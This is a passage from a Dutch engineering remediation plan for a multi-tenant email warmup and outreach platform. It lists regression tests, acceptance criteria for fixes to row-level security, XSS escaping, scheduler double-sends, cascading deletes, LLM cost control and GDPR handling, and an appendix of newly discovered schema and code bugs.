| `tests/test_promotion_lifecycle.py` | `test_concurrent_double_promotion_single_event` | Twee gelijktijdige promoties | 1 promotie + 1 event |
| ″ | `test_promotion_emits_event_with_idempotency_key` | Promotie | `webhook_events`-rij met key |
| ″ | `test_low_reply_rate_blocks_promotion` | reply_rate 0.10 | `low_reply_rate`, geen event |
| ″ | `test_already_ready_is_noop` | status ready | no-op, geen event |
| `tests/test_client_delete_cascade.py` | `test_client_delete_cascades_all_tenant_tables` | Delete client | Nul rijen overal, andere tenant intact |
| `tests/test_scheduler_safety.py` | lock / daily_reset / claim | Tweede run, twee workers | Lock blokkeert; 0-rij reset; één winnaar |
| `tests/test_cost_control.py` | budget-failover / spend-RPC | Budget over; spend-query | Template i.p.v. exception; geen scan |
| `tests/test_gdpr_fixes.py` | unsubscribe/suppress/delete/retention/audit | Zie §9 | Groen |
| `tests/run_all.py` | volledige suite | Alle modules | ≥ 205 groen |

**Uitvoeren:** `source .venv/bin/activate && python tests/run_all.py` (unit); RLS/cascade-tests vereisen live Supabase-creds (skippen zonder). JS: `node tests/test_xss_rendering.mjs`.

---

## 11. Acceptance criteria

De Criticals zijn klaar wanneer:

1. **RLS (C1):** geen tenant-tabel zonder RLS **of** zonder `REVOKE anon/authenticated`; `test_rls_hardening.py` groen; een tweede-tenant-JWT leest/schrijft nul vreemde rijen in de 8 tabellen.
2. **XSS (C2):** geen untrusted `innerHTML`-sink zonder `escapeHtml`/`safeText`; `safe-dom.js` op alle 17 pagina's vóór `app.js`; de 4 payloads renderen inert; regressie-guard groen. (Phase B: `script-src` zonder `'unsafe-inline'`.)
3. **Promotie (C3):** een inbox die aan alle 7 criteria voldoet gaat automatisch naar `ready` (event-driven + hourly sweep); Heater ontvangt `inbox.warmup_complete` (dispatcher levert de `webhook_events`-rij); twee gelijktijdige promoties → precies één event; `inboxes.reply_rate` wordt gevuld.
4. **Cascade-FK (C4):** `SELECT conname … LIKE 'fk_%client%'` → 28 FK's, `CASCADE`, `convalidated=true`; geen `client_id TEXT`; `test_client_delete_cascade.py` groen (nul weesrijen).
5. **Scheduler (C5):** dubbele/drievoudige runners kunnen niet dubbel verzenden (lock + atomaire claim + `sent`-unique-index); `daily_reset` reset hooguit één keer per dag; `increment_daily_sent`-RPC bestaat; één scheduler actief.
6. **Kosten (C6):** warmup stopt/degradeert naar `maintenance` (nul live LLM) na READY; `get_daily_spend` doet een aggregaat, geen full-scan; budget-uitputting degradeert naar template i.p.v. de send af te breken.
7. **GDPR (C7):** reply "uitschrijven" → suppressie-rij + alle pending sends geannuleerd; `is_suppressed` blokkeert email én domein; `admin_delete_client` laat nul PII-weesrijen achter (over alle client_id- + FK-only-tabellen); `retention_engine` verwijdert verlopen data en is als launchd-job geïnstalleerd; `compliance_overview` claimt alleen 30-daagse verwijdering als de job draait; export/delete schrijven een audit-rij; e-mails zijn gemaskeerd in logs.

**Overall:** `python tests/run_all.py` groen; de vijf migraties gedraaid (C4 in een venster met PITR); één scheduler; geen Critical open in een her-audit.

---

## Appendix — nieuw ontdekte blockers (stonden niet in de audit)

1. **`inboxes.reply_rate` heeft geen writer** → het reply_rate-criterium zou álle promoties blokkeren (C3). Fix: `refresh_inbox_reply_rates` in `daily_reset`.
2. **8 intermediate child-FK's zijn `NO ACTION`** → de cascade faalt mid-way zelfs met correcte client-FK's (C4). Fix: die 8 óók naar `ON DELETE CASCADE`.
3. **`admin_delete_client` filtert `warmup_logs`/`bounce_log` op een niet-bestaande `client_id`** → die deletes erroren stil (C4/C7). Fix: via `inbox_id`.
4. **`email_events` heeft geen `client_id`** maar `compliance_overview`/events-CSV filteren erop → stille lege reads (C7). Verifieer live kolom.
5. **RPC-arg heet `inbox_uuid`**, niet `p_inbox`; **`email_events`** heeft `sequence_step_id`, niet `sequence_step` (C5). Migratie hierop aangepast.
6. **Session-`pg_try_advisory_lock` is onbetrouwbaar via PostgREST** (stateless pooled HTTP) → lease-row-lock i.p.v. (C5).
7. **`campaign_scheduler.main(client_id=…)`-TypeError** maakte het n8n-campagnepad al een stille no-op → fix de signatuur en je krijgt anders meteen dubbele sends (C5).
